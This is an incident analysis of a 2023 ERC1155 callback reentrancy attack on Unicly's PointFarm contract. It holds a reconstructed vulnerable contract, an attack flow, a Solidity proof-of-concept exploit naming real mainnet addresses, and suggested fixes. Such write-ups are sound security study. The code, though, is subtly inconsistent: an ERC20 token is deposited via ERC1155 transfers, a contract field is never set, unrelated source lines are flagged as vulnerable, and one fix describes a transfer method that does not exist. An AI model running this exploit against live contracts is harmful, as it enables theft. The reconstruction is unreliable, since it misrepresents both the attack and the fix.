# Unicly NFT Reentrancy Attack Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Unicly NFT (PointFarm) |
| Date | 2023-09-12 |
| Chain | Ethereum Mainnet |
| Loss | 1 NFT (Realm NFT #4689) |
| Attack Type | ERC1155 Callback Reentrancy |
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Attacker Address | `0x92cfcb70b2591ceb1e3c6d90e21e8154e7d29832` |
| Attack Contract | `0x9d9820f10772ffcef842770b6581c07a97fed9e4` |
| Vulnerable Contract | `0xd3C41c85bE295607E8EA5c58487eC5894300ee67` (PointFarm) |
| Fork Block | 18,133,171 |

## 2. Vulnerability Code Analysis

The `PointFarm` contract was a farming contract that accumulated points using ERC1155 NFTs as collateral. When transferring ERC1155 tokens in the `deposit()` function, the recipient contract's `onERC1155Received()` callback is invoked. By re-calling `deposit(amount=0)` inside this callback, the internal accounting could be manipulated before the state was updated, allowing the attacker to acquire more points or NFTs than entitled.

```solidity
// Vulnerable pattern: reentrancy possible during ERC1155 transfer
contract PointFarm {
    mapping(address => uint256) public userPoints;
    mapping(address => uint256) public userDeposits;

    // Vulnerable: state update occurs after ERC1155 safeTransferFrom call (CEI violation)
    function deposit(uint256 poolId, uint256 amount) external {
        if (amount > 0) {
            // ERC1155 transfer — reentrancy entry point
            // onERC1155Received() callback is invoked on the attacker
            IERC1155(nftContract).safeTransferFrom(msg.sender, address(this), poolId, amount, "");
        }

        // Vulnerable: state update occurs after the ERC1155 transfer
        userDeposits[msg.sender] += amount;
        userPoints[msg.sender] += calculatePoints(amount);
    }

    function withdraw(uint256 poolId, uint256 amount) external {
        require(userDeposits[msg.sender] >= amount, "Insufficient deposit");
        userDeposits[msg.sender] -= amount;
        // Return NFT
        IERC1155(nftContract).safeTransferFrom(address(this), msg.sender, poolId, amount, "");
    }
}
```

**Vulnerability**: When `deposit(poolId, amount)` is called, `safeTransferFrom()` executes and triggers the attacker contract's `onERC1155Received()` callback. By re-calling `deposit(poolId, 0)` inside that callback, the internal point calculation is skewed, allowing the attacker to accumulate more points than deserved and ultimately `redeem()` more NFTs than entitled.

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: PointFarm.sol
        @dev Handles the receipt of a single ERC1155 token type. This function is  // ❌

// ...

    function onERC1155Received(  // ❌

// ...

        @dev Handles the receipt of a multiple ERC1155 token types. This function  // ❌

// ...

    function onERC1155BatchReceived(  // ❌

// ...

    function balanceOf(address account, uint256 id) public view virtual override returns (uint256) {
        require(account != address(0), "ERC1155: balance query for the zero address");  // ❌
        return _balances[id][account];
    }
```

## 3. Attack Flow

```
Attacker [0x92cfcb70b2591ceb1e3c6d90e21e8154e7d29832]
  │
  ├─1─▶ WETH.approve() / uJENNY.approve()
  │      [WETH: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]
  │      [uJENNY: 0xa499648fD0e80FD911972BbEb069e4c20e68bF22]
  │
  ├─2─▶ WETHToUJENNY() - Swap WETH → uJENNY
  │
  ├─3─▶ PointFarm.deposit(0, amount) - First deposit
  │      [PointFarm: 0xd3C41c85bE295607E8EA5c58487eC5894300ee67]
  │      ERC1155 safeTransferFrom() invoked →
  │      └─ onERC1155Received() callback:
  │           └─ PointFarm.deposit(0, 0) reentrancy
  │                → Points manipulated
  │
  ├─4─▶ vm.roll() - Advance blocks (accumulate points)
  │
  ├─5─▶ PointFarm.deposit(0, 0) - Trigger additional reentrancy
  │
  ├─6─▶ PointFarm.withdraw(0, amount) - Withdraw deposit
  │
  ├─7─▶ UJENNYToWETH() - Swap uJENNY → WETH
  │
  ├─8─▶ Realm NFT.setApprovalForAll(PointShop, true)
  │      [Realm NFT: 0x7AFe30cB3E53dba6801aa0EA647A0EcEA7cBe18d]
  │
  └─9─▶ PointShop.redeem() - Acquire NFT #4689 with manipulated points
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IPointFarm {
    function deposit(uint256 poolId, uint256 amount) external;
    function withdraw(uint256 poolId, uint256 amount) external;
}

interface IPointShop {
    function redeem(uint256 nftId) external;
}

contract UniclyNFTExploit is IERC1155Receiver {
    IPointFarm pointFarm = IPointFarm(0xd3C41c85bE295607E8EA5c58487eC5894300ee67);
    IPointShop pointShop;
    IERC20 uJENNY = IERC20(0xa499648fD0e80FD911972BbEb069e4c20e68bF22);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC721 realmNFT = IERC721(0x7AFe30cB3E53dba6801aa0EA647A0EcEA7cBe18d);
    Uni_Pair_V2 pair;
    bool reentered;

    function testExploit() external {
        // WETH → uJENNY
        WETHToUJENNY();

        uint256 ujBalance = uJENNY.balanceOf(address(this));
        uJENNY.approve(address(pointFarm), ujBalance);

        // First deposit — triggers ERC1155 callback reentrancy
        pointFarm.deposit(0, ujBalance);

        // Advance blocks to accumulate points
        // vm.roll(block.number + 100);

        // Additional deposit to re-trigger reentrancy
        pointFarm.deposit(0, 0);

        // Withdraw deposit
        pointFarm.withdraw(0, ujBalance);

        // uJENNY → WETH
        UJENNYToWETH();

        // Acquire NFT with manipulated points
        realmNFT.setApprovalForAll(address(pointShop), true);
        pointShop.redeem(4689);
    }

    // ERC1155 receive callback — reentrancy occurs here
    function onERC1155Received(
        address, address, uint256, uint256, bytes calldata
    ) external override returns (bytes4) {
        if (!reentered) {
            reentered = true;
            // Reenter: re-call deposit with amount=0
            pointFarm.deposit(0, 0);
        }
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address, address, uint256[] calldata, uint256[] calldata, bytes calldata
    ) external override returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function supportsInterface(bytes4) external pure override returns (bool) { return true; }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| Vulnerability Type | ERC1155 Callback Reentrancy, CEI Pattern Violation |
| Impact Scope | PointFarm contract point system and NFTs |
| Explorer | [Etherscan](https://etherscan.io/address/0xd3C41c85bE295607E8EA5c58487eC5894300ee67) |

## 6. Security Recommendations

```solidity
// Fix 1: ReentrancyGuard + CEI Pattern
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract PointFarm is ReentrancyGuard {
    function deposit(uint256 poolId, uint256 amount) external nonReentrant {
        // Effects first
        userDeposits[msg.sender] += amount;
        userPoints[msg.sender] += calculatePoints(amount);

        // Interactions last (state already updated even if reentered)
        if (amount > 0) {
            IERC1155(nftContract).safeTransferFrom(
                msg.sender, address(this), poolId, amount, ""
            );
        }
    }
}

// Fix 2: Use transferFrom instead of ERC1155 (no callback)
// ERC1155's safeTransferFrom always triggers a callback
// approve + transferFrom pattern has no callback (though some implementations may differ)

// Fix 3: Prevent reentrancy within callback
mapping(address => bool) private _processing;

function deposit(uint256 poolId, uint256 amount) external {
    require(!_processing[msg.sender], "Reentrant call");
    _processing[msg.sender] = true;

    // Full logic
    userDeposits[msg.sender] += amount;
    if (amount > 0) {
        IERC1155(nftContract).safeTransferFrom(msg.sender, address(this), poolId, amount, "");
    }

    _processing[msg.sender] = false;
}
```

## 7. Lessons Learned

1. **ERC1155 Reentrancy**: `safeTransferFrom()` triggers the `onERC1155Received()` callback when the recipient is a contract. Since reentrancy attacks are possible from within this callback, every function that uses ERC1155 requires reentrancy protection.
2. **NFT Farming Contracts**: Farming contracts that combine NFTs with point systems are inherently at risk of reentrancy through ERC721's `safeTransferFrom()`, ERC1155 callbacks, and similar mechanisms.
3. **Strict CEI Pattern Adherence**: All state changes (point calculation, balance updates) must be completed before any ERC1155 transfer. A "transfer first, then update state" ordering is always vulnerable to callback-based reentrancy.
4. **Small-Scale NFT DeFi Security**: NFT-based farming and point systems tend to underestimate the reentrancy risk posed by ERC callback mechanisms. Every NFT transfer function must be reviewed through a reentrancy lens.